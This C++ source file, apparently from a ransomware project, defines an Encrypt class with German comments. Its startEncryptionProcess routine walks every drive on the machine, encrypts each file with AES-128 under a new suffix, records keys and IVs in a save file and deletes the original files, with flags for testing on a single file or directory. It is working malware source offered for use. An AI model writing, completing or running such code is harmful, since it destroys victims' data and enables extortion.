//
// Created by prang on 25.09.2024.
//

#include <vector>
#include <iostream>
#include "encryptor.h"
#include "../utils/CryptoAes128.h"
#include "../utils/SystemUtils.h"
#include "../utils/FileUtils.h"
#include "../../include/global.h"

void Encrypt::createSaveFile() {
  if (fs::exists(KEY_IV_SAVE_FILE)) {
    fs::remove(KEY_IV_SAVE_FILE);
  }

  std::ofstream outFile(KEY_IV_SAVE_FILE);

  if (!outFile) {
    std::cerr << "Fehler beim Erstellen der Datei: " << KEY_IV_SAVE_FILE << std::endl;
  }

  outFile << FILE_HEADER + '\n';

  outFile.close();
}

void Encrypt::printPathList(std::vector<fs::path> &file_list) {
  int pathAmount = 0;
  for (const auto &path: file_list) {
    pathAmount++;
    std::cout << "Path (" << pathAmount << "): " << path << std::endl;
  }
}

void Encrypt::startEncryptionProcess() {
  FileUtils fileUtils;
  CryptoAes128 cryptoAes128;
  SystemUtils systemUtils;
  createSaveFile();



  std::vector<fs::path> file_list;
  if (SINGLE_FILE_TEST) {
    std::cout << TEST_FILE_PATH << std::endl;
    file_list = {TEST_FILE_PATH};  // bleibt fs::path
  } else if (DIRECTORY_TEST) {
    file_list = fileUtils.listFiles({TEST_DIRECTORY}, true);
  } else {
    file_list = fileUtils.listFiles(systemUtils.getAllDrives(), true);
  }

  size_t pathAmount = file_list.size();

  int fileCounter = 0;
  int encryptionCounter = 0;
  for (const auto &file: file_list) {
    fileCounter++;
    // Korrekte Zusammenführung des Dateinamens und des Suffixes
    fs::path encryptedFile = file.parent_path() / (file.filename().wstring() + ENC_FILE_SUFFIX);

    if (cryptoAes128.encryptFileAES128(file, encryptedFile)) {
      encryptionCounter++;
      std::cout << "Encryption Succeeded at Path (" << fileCounter << "/" << pathAmount <<  "): " << file << std::endl;
    } else {
      std::cerr << "Encrypting failed at Path (" << fileCounter << "/" << pathAmount << "): " << file << std::endl;
      continue;
    }

    if (fs::exists(encryptedFile)) {
      fs::remove(file);
    } else {
      std::cerr << "Encrypted file not found for deletion: Path (" << fileCounter << "/" << pathAmount << "): " << file << std::endl;
    }

  }

  std::cout << encryptionCounter << "/" << pathAmount << " files have been encrypted." << std::endl;
}
